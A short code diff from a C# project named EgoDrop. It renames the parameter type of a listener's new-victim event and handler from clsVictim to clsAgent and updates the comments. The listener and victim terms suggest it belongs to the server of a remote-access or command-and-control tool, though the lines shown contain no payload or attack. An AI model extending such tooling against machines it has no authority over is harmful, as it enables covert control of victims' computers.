@@ -16,7 +16,7 @@ namespace EgoDrop
         public clsSqlite.stListener m_stListener { get; set; }
         public bool m_bIsListening { get; set; }
 
-        public delegate void dlgNewVictim(clsListener listener, clsVictim victim);
+        public delegate void dlgNewVictim(clsListener listener, clsAgent agent);
         public event dlgNewVictim evtNewVictim;
         public delegate void dlgReceivedMessage(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg);
         public event dlgReceivedMessage evtReceivedMessage;
@@ -41,12 +41,12 @@ namespace EgoDrop
         }
 
         /// <summary>
-        /// Add new victim.
+        /// Add new agent.
         /// </summary>
-        /// <param name="victim"></param>
-        public void fnOnNewVictim(clsVictim victim)
+        /// <param name="agent">Agent object.</param>
+        public void fnOnNewVictim(clsAgent agent)
         {
-            evtNewVictim?.Invoke(this, victim);
+            evtNewVictim?.Invoke(this, agent);
         }
 
         /// <summary>
